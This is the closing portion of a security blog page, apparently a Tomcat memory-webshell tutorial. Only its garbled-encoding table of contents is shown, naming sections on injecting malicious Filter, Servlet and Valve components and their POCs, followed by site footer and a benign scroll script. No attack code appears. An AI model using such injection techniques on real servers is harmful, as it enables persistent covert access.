<li><a href="#filter%E6%B3%A8%E5%86%8C%E5%88%86%E6%9E%90">Filteræ³¨å†Œåˆ†æ</a>
<ul>
<li><a href="#standardcontext-2">StandardContext</a></li>
<li><a href="#filterconfigs">filterConfigsï¼š</a></li>
<li><a href="#filterdef">filterDefï¼š</a></li>
<li><a href="#filterdefs">filterDefs</a></li>
<li><a href="#filtermaps">filterMaps</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%86%8Cfilter%E6%80%9D%E8%B7%AF">æ³¨å†ŒFilteræ€è·¯</a>
<ul>
<li><a href="#%E8%8E%B7%E5%8F%96standardcontext%E5%AF%B9%E8%B1%A1">è·å–StandardContextå¯¹è±¡</a></li>
<li><a href="#1-%E5%88%9B%E5%BB%BA%E6%81%B6%E6%84%8Ffilter">1. åˆ›å»ºæ¶æ„Filter</a></li>
<li><a href="#filterdef%E5%AF%B9filter%E8%BF%9B%E8%A1%8C%E5%B0%81%E8%A3%85">FilterDefå¯¹Filterè¿›è¡Œå°è£…</a></li>
<li><a href="#%E5%88%9B%E5%BB%BAfiltermap%E7%B1%BB">åˆ›å»ºfilterMapç±»</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5%E5%88%B0filterconfigs%E4%B8%AD">æ³¨å…¥åˆ°filterConfigsä¸­</a></li>
</ul>
</li>
<li><a href="#poc">POC</a></li>
</ul>
</li>
<li><a href="#servlet%E5%9E%8B">Servletå‹</a>
<ul>
<li><a href="#%E7%BC%96%E5%86%99%E6%81%B6%E6%84%8Fservlet">ç¼–å†™æ¶æ„servlet</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5servlet%E5%86%85%E5%AD%98%E9%A9%AC">æ³¨å…¥servletå†…å­˜é©¬</a>
<ul>
<li><a href="#%E5%88%9B%E5%BB%BAstandardwrapper">åˆ›å»ºStandardWrapper</a></li>
<li><a href="#%E5%8A%A0%E8%BD%BDstandwrapper">åŠ è½½StandWrapper</a></li>
</ul>
</li>
<li><a href="#poc-2">POC</a></li>
</ul>
</li>
<li><a href="#valve%E5%9E%8B">Valveå‹</a>
<ul>
<li><a href="#%E7%AE%A1%E9%81%93%E6%9C%BA%E5%88%B6%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90">ç®¡é“æœºåˆ¶æµç¨‹åˆ†æ</a></li>
<li><a href="#%E6%B3%A8%E5%85%A5valve">æ³¨å…¥Valve</a></li>
<li><a href="#poc-3">POC</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://bloyet.github.io/post/log4j2-fan-xu-lie-hua/">
              <h3 class="post-title">
                Log4j2ååºåˆ—åŒ–
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://bloyet.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
